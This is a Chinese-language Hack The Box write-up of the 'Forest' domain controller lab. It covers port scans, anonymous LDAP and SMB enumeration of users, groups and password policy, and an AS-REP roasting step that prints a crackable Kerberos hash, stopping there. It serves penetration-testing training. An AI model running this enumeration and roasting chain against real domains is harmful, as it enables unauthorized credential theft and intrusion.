---
title: HTB-Forest Writeup
date: 2026-04-18T16:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - Windows
  - LDAP
  - SMB
  - GetNPUsers
  - BloodHound
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]                                                                                                                                                              
└─$ cat Nmap/port.nmap                                                                                                                                                                            
# Nmap 7.98 scan initiated Tue Apr 14 20:37:17 2026 as: /usr/lib/nmap/nmap --min-rate 10000 -p- -oA Nmap/port 10.129.95.210                                                                       
Nmap scan report for 10.129.95.210                                                                                                                                                                
Host is up (0.16s latency).                                                                                                                                                                       
Not shown: 65511 closed tcp ports (reset)                                                                                                                                                         
PORT      STATE SERVICE                                                                                                                                                                           
53/tcp    open  domain                                                                                                                                                                            
88/tcp    open  kerberos-sec                                                                                                                                                                      
135/tcp   open  msrpc                                                                                                                                                                             
139/tcp   open  netbios-ssn                                                                                                                                                                       
389/tcp   open  ldap                                                                                                                                                                              
445/tcp   open  microsoft-ds                                                                                                                                                                      
464/tcp   open  kpasswd5                                                                                                                                                                          
593/tcp   open  http-rpc-epmap                                                                                                                                                                    
636/tcp   open  ldapssl                                                                                                                                                                           
3268/tcp  open  globalcatLDAP                                                                                                                                                                     
3269/tcp  open  globalcatLDAPssl                                                                                                                                                                  
5985/tcp  open  wsman                                                                                                                                                                             
9389/tcp  open  adws                                                                                                                                                                              
47001/tcp open  winrm                                                                                                                                                                             
49664/tcp open  unknown                                                                                                                                                                           
49665/tcp open  unknown                                                                                                                                                                           
49666/tcp open  unknown                                                                                                                                                                           
49667/tcp open  unknown                                                                                                                                                                           
49671/tcp open  unknown                                                                                                                                                                           
49680/tcp open  unknown                         
49681/tcp open  unknown                         
49685/tcp open  unknown                         
49700/tcp open  unknown                         
49858/tcp open  unknown                         

# Nmap done at Tue Apr 14 20:37:30 2026 -- 1 IP address (1 host up) scanned in 12.69 seconds

```

看 Nmap 的端口扫描结果，大概率为 Windows 域服务机器。

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ grep open Nmap/port.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49680,49681,49685,49700,49858
 
```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ sudo nmap -sT -sC -sV -O -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49680,49681,49685,49700,49858 10.129.95.210
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-14 20:42 -0400
Nmap scan report for 10.129.95.210
Host is up (0.15s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-15 00:49:09Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49685/tcp open  msrpc        Microsoft Windows RPC
49700/tcp open  msrpc        Microsoft Windows RPC
49858/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or 2012 R2 (97%), Microsoft Windows Server 2016 or Server 2019 (96%), Microsoft Windows Server 2012 (95%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows 10 1703 or Windows 11 21H2 (94%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-04-14T17:50:06-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-04-15T00:50:05
|_  start_date: 2026-04-15T00:36:57
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m48s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.03 seconds

```

发现两个域名，解析到 `hosts`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ tail -n 1 /etc/hosts
10.129.95.210 htb.local forest.htb.local
```

## 信息收集

执行 LDAP 匿名探测。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ ldapsearch -x -H ldap://10.129.95.210 -s base namingcontexts                                                                                                                   
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

允许匿名绑定，进一步枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName description userAccountControl memberOf         
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName description userAccountControl memberOf 
#

# Guest, Users, htb.local
dn: CN=Guest,CN=Users,DC=htb,DC=local
description: Built-in account for guest access to the computer/domain
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
userAccountControl: 66082
sAMAccountName: Guest

# DefaultAccount, Users, htb.local
dn: CN=DefaultAccount,CN=Users,DC=htb,DC=local
description: A user account managed by the system.
memberOf: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
userAccountControl: 66082
sAMAccountName: DefaultAccount

# FOREST, Domain Controllers, htb.local
dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
userAccountControl: 532480
sAMAccountName: FOREST$

# EXCH01, Computers, htb.local
dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
memberOf: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Obje
 cts,DC=htb,DC=local
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
 s,DC=htb,DC=local
memberOf: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,
 DC=htb,DC=local
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
 local
userAccountControl: 4096
sAMAccountName: EXCH01$

# Exchange Online-ApplicationAccount, Users, htb.local
dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
userAccountControl: 546
sAMAccountName: $331000-VK4ADACQNUCA

# SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}, Users, htb.local
dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_2c8eef0a09b545acb

# SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}, Users, htb.local
dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_ca8c2ed5bdab4dc9b

# SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}, Users, htb.local
dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_75a538d3025e4db9a

# DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}, Users, htb.loc
 al
dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
 DC=htb,DC=local
userAccountControl: 514
sAMAccountName: SM_681f53d4942840e18

# Migration.8f3e7716-2011-43e4-96b1-aba62d229136, Users, htb.local
dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
userAccountControl: 514
sAMAccountName: SM_1b41c9286325456bb

# FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042, Users, htb.local
dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_9b69f1b9d2cc45549

# SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}, Users, htb.local
dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_7c96b981967141ebb

# SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}, Users, htb.local
dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_c75ee099d0a64c91b

# SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}, Users, htb.local
dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=htb,DC=
 local
userAccountControl: 514
sAMAccountName: SM_1ffab36a2f5f479cb

# HealthMailboxc3d7722415ad41a5b19e3e00e165edbe, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxc3d7722

# HealthMailboxfc9daad117b84fe08b081886bd8a5a50, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxfc9daad

# HealthMailboxc0a90c97d4994429b15003d6a518f3f5, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxc0a90c9

# HealthMailbox670628ec4dd64321acfdf6e67db3a2d8, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox670628e

# HealthMailbox968e74dd3edb414cb4018376e7dd95ba, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox968e74d

# HealthMailbox6ded67848a234577a1756e072081d01f, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox6ded678

# HealthMailbox83d6781be36b4bbf8893b03c2ee379ab, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox83d6781

# HealthMailboxfd87238e536e49e08738480d300e3772, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxfd87238

# HealthMailboxb01ac647a64648d2a5fa21df27058a24, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailboxb01ac64

# HealthMailbox7108a4e350f84b32a7a90d8e718f78cf, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox7108a4e

# HealthMailbox0659cc188f4c4f9f978f6c2142c4181e, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: HealthMailbox0659cc1

# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
 htb.local
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
 =Employees,DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: sebastien

# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
 DC=htb,DC=local
userAccountControl: 66048
sAMAccountName: lucinda

# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
userAccountControl: 66048
sAMAccountName: andy

# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
 DC=local
userAccountControl: 66048
sAMAccountName: mark

# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
 =htb,DC=local
userAccountControl: 66048
sAMAccountName: santi

# search reference
ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local

# search reference
ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local

# search reference
ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 34
# numEntries: 30
# numReferences: 3

```

执行 enum4linux 枚举 smb。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ enum4linux-ng htb.local | tee enum4linux_scan.txt              
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... htb.local
[*] Username ......... ''
[*] Random Username .. 'lzjfmgag'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

 ==================================
|    Listener Scan on htb.local    |
 ==================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =================================================
|    Domain Information via LDAP for htb.local    |
 =================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: htb.local

 ========================================================
|    NetBIOS Names and Workgroup/Domain for htb.local    |
 ========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ======================================
|    SMB Dialect Check on htb.local    |
 ======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ========================================================
|    Domain Information via SMB session for htb.local    |
 ========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: FOREST
NetBIOS domain name: HTB
DNS domain: htb.local
FQDN: FOREST.htb.local
Derived membership: domain member
Derived domain: HTB

 ======================================
|    RPC Session Check on htb.local    |
 ======================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 ================================================
|    Domain Information via RPC for htb.local    |
 ================================================
[+] Domain: HTB
[+] Domain SID: S-1-5-21-3072663084-364016917-1341370565
[+] Membership: domain member

 ============================================
|    OS Information via RPC for htb.local    |
 ============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows Server 2016 Standard 14393
OS version: '10.0'
OS release: '1607'
OS build: '14393'
Native OS: Windows Server 2016 Standard 14393
Native LAN manager: Windows Server 2016 Standard 6.3
Platform id: null
Server type: null
Server type string: null

 ==================================
|    Users via RPC on htb.local    |
 ==================================
[*] Enumerating users via 'querydispinfo'
[+] Found 31 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 31 user(s) via 'enumdomusers'
[+] After merging user results we have 31 user(s) total:
'1123':
  username: $331000-VK4ADACQNUCA
  name: (null)
  acb: '0x00020015'
  description: (null)
'1124':
  username: SM_2c8eef0a09b545acb
  name: Microsoft Exchange Approval Assistant
  acb: '0x00020011'
  description: (null)
'1125':
  username: SM_ca8c2ed5bdab4dc9b
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1126':
  username: SM_75a538d3025e4db9a
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1127':
  username: SM_681f53d4942840e18
  name: Discovery Search Mailbox
  acb: '0x00020011'
  description: (null)
'1128':
  username: SM_1b41c9286325456bb
  name: Microsoft Exchange Migration
  acb: '0x00020011'
  description: (null)
'1129':
  username: SM_9b69f1b9d2cc45549
  name: Microsoft Exchange Federation Mailbox
  acb: '0x00020011'
  description: (null)
'1130':
  username: SM_7c96b981967141ebb
  name: E4E Encryption Store - Active
  acb: '0x00020011'
  description: (null)
'1131':
  username: SM_c75ee099d0a64c91b
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1132':
  username: SM_1ffab36a2f5f479cb
  name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
  acb: '0x00020011'
  description: (null)
'1134':
  username: HealthMailboxc3d7722
  name: HealthMailbox-EXCH01-Mailbox-Database-1118319013
  acb: '0x00000210'
  description: (null)
'1135':
  username: HealthMailboxfc9daad
  name: HealthMailbox-EXCH01-001
  acb: '0x00000210'
  description: (null)
'1136':
  username: HealthMailboxc0a90c9
  name: HealthMailbox-EXCH01-002
  acb: '0x00000210'
  description: (null)
'1137':
  username: HealthMailbox670628e
  name: HealthMailbox-EXCH01-003
  acb: '0x00000210'
  description: (null)
'1138':
  username: HealthMailbox968e74d
  name: HealthMailbox-EXCH01-004
  acb: '0x00000210'
  description: (null)
'1139':
  username: HealthMailbox6ded678
  name: HealthMailbox-EXCH01-005
  acb: '0x00000210'
  description: (null)
'1140':
  username: HealthMailbox83d6781
  name: HealthMailbox-EXCH01-006
  acb: '0x00000210'
  description: (null)
'1141':
  username: HealthMailboxfd87238
  name: HealthMailbox-EXCH01-007
  acb: '0x00000210'
  description: (null)
'1142':
  username: HealthMailboxb01ac64
  name: HealthMailbox-EXCH01-008
  acb: '0x00000210'
  description: (null)
'1143':
  username: HealthMailbox7108a4e
  name: HealthMailbox-EXCH01-009
  acb: '0x00000210'
  description: (null)
'1144':
  username: HealthMailbox0659cc1
  name: HealthMailbox-EXCH01-010
  acb: '0x00000210'
  description: (null)
'1145':
  username: sebastien
  name: Sebastien Caron
  acb: '0x00000210'
  description: (null)
'1146':
  username: lucinda
  name: Lucinda Berger
  acb: '0x00000210'
  description: (null)
'1147':
  username: svc-alfresco
  name: svc-alfresco
  acb: '0x00010210'
  description: (null)
'1150':
  username: andy
  name: Andy Hislip
  acb: '0x00000210'
  description: (null)
'1151':
  username: mark
  name: Mark Brandt
  acb: '0x00000210'
  description: (null)
'1152':
  username: santi
  name: Santi Rodriguez
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: Administrator
  acb: '0x00000010'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00000011'
  description: Key Distribution Center Service Account
'503':
  username: DefaultAccount
  name: (null)
  acb: '0x00000215'
  description: A user account managed by the system.

 ===================================
|    Groups via RPC on htb.local    |
 ===================================
[*] Enumerating local groups
[+] Found 5 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 29 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 38 group(s) via 'enumdomgroups'
[+] After merging groups results we have 72 group(s) total:
'1101':
  groupname: DnsAdmins
  type: local
'1102':
  groupname: DnsUpdateProxy
  type: domain
'1104':
  groupname: Organization Management
  type: domain
'1105':
  groupname: Recipient Management
  type: domain
'1106':
  groupname: View-Only Organization Management
  type: domain
'1107':
  groupname: Public Folder Management
  type: domain
'1108':
  groupname: UM Management
  type: domain
'1109':
  groupname: Help Desk
  type: domain
'1110':
  groupname: Records Management
  type: domain
'1111':
  groupname: Discovery Management
  type: domain
'1112':
  groupname: Server Management
  type: domain
'1113':
  groupname: Delegated Setup
  type: domain
'1114':
  groupname: Hygiene Management
  type: domain
'1115':
  groupname: Compliance Management
  type: domain
'1116':
  groupname: Security Reader
  type: domain
'1117':
  groupname: Security Administrator
  type: domain
'1118':
  groupname: Exchange Servers
  type: domain
'1119':
  groupname: Exchange Trusted Subsystem
  type: domain
'1120':
  groupname: Managed Availability Servers
  type: domain
'1121':
  groupname: Exchange Windows Permissions
  type: domain
'1122':
  groupname: ExchangeLegacyInterop
  type: domain
'1133':
  groupname: $D31000-NSEL5BRJ63V7
  type: domain
'1148':
  groupname: Service Accounts
  type: domain
'1149':
  groupname: Privileged IT Accounts
  type: domain
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'5101':
  groupname: test
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'516':
  groupname: Domain Controllers
  type: domain
'517':
  groupname: Cert Publishers
  type: local
'518':
  groupname: Schema Admins
  type: domain
'519':
  groupname: Enterprise Admins
  type: domain
'520':
  groupname: Group Policy Creator Owners
  type: domain
'521':
  groupname: Read-only Domain Controllers
  type: domain
'522':
  groupname: Cloneable Domain Controllers
  type: domain
'525':
  groupname: Protected Users
  type: domain
'526':
  groupname: Key Admins
  type: domain
'527':
  groupname: Enterprise Key Admins
  type: domain
'544':
  groupname: Administrators
  type: builtin
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'548':
  groupname: Account Operators
  type: builtin
'549':
  groupname: Server Operators
  type: builtin
'550':
  groupname: Print Operators
  type: builtin
'551':
  groupname: Backup Operators
  type: builtin
'552':
  groupname: Replicator
  type: builtin
'553':
  groupname: RAS and IAS Servers
  type: local
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'571':
  groupname: Allowed RODC Password Replication Group
  type: local
'572':
  groupname: Denied RODC Password Replication Group
  type: local
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
'575':
  groupname: RDS Remote Access Servers
  type: builtin
'576':
  groupname: RDS Endpoint Servers
  type: builtin
'577':
  groupname: RDS Management Servers
  type: builtin
'578':
  groupname: Hyper-V Administrators
  type: builtin
'579':
  groupname: Access Control Assistance Operators
  type: builtin
'580':
  groupname: Remote Management Users
  type: builtin
'581':
  groupname: System Managed Accounts Group
  type: builtin
'582':
  groupname: Storage Replica Administrators
  type: builtin 

 ===================================
|    Shares via RPC on htb.local    |
 ===================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ======================================
|    Policies via RPC for htb.local    |
 ======================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Minimum password age: 1 day 4 minutes
  Maximum password age: not set
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set

 ======================================
|    Printers via RPC for htb.local    |
 ======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 39.46 seconds

```

扫描结果暴露出许多用户名，建立一个 `users.txt`，将他们存放进去。

除此之外，将这些人名的姓与名拆分开一并存放在 `users.txt` 当中。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ vim users.txt 
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ cat users.txt 
Sebastien Caron
Lucinda Berger
Mark Brandt
Santi Rodriguez
Andy Hislip
svc-alfresco
Administrator
sebastien
caron
lucinda
berger
mark
brandt
santi
rodriguez
andy
hislip

```

## GetUsers 探测

用 GetUsers 探测 `users.txt` 字典存活的用户。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ impacket-GetNPUsers htb.local/ -usersfile users.txt -format hashcat -outputfile GetNPUsers_out.txt -dc-ip 10.129.95.210
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:44df6b446b931da83da11e8ae97ce497$82411bf5132724dfac615e77b3a1348e4055fe2621a54c731d2c5ab4d7af297031e2d6993b7520d80465b92709eea3dc6aaa97ab46bf0b3f6fb86aa95ea776d36d7d4286d40e64555613d646aa1c741cb0b295d93e63d7bb4e7feed4151895c10ff63827f48d1d67bdb543cb3f94acf4f85c2032813f45a1ccaddfd59602b8eed4fd48c1e9eea70235eb7c69e318d11e9e4c84cce08775ef2cfd35236552b914f5ada5867ecc653896384ccafdeb265c7ec645835461dc68d147c0477f8fc0fd8c0d781fa181e2897ff0f4747987c5554952f1132308d4fe8b2f016250f623229878664e3d4c
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
